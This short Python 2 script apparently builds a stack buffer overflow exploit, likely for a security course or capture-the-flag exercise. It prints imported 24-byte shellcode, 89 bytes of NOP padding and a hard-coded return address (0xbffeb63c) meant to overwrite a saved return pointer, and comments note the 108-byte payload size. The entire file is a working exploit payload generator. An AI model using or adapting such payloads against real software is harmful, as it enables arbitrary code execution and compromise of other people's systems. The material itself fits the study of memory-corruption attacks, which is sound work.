from struct import pack
from shellcode import shellcode
print shellcode + '\x90' * 89 + pack("<I", 0xbffeb63c)

# shellcode size = 24 bytes
# Total output size = 108 bytes 